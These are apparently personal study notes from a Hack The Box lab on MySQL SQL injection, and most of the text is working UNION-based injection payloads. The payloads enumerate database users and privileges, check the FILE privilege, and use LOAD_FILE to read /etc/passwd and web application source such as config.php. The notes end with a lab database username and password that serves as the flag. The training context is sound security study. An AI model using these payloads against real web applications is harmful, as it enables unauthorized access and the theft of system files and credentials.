in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

#### DB User
>While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

#### User Privileges
```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

![[nto0xppf.png]]


>?`Y`, which means `YES`, indicating superuser privileges.

more dumping:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files.



## LOAD_FILE
`LOAD_FILE()` function.
```sql
SELECT LOAD_FILE('/etc/passwd');
```
Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

## Another Example
We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
config.php
search for  uncluded codes
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

The HTML source can be viewed by hitting `[Ctrl + U]`.
![PHP code snippet for querying a database. It checks if 'port_code' is set, constructs a SQL query to select from 'ports' where code matches, executes the query, and fetches results](https://academy.hackthebox.com/storage/modules/33/load_file_source.png)


>`The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.`


'DB_USERNAME'=>'root',
'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!',
'DB_DATABASE'=>'ilfreight'

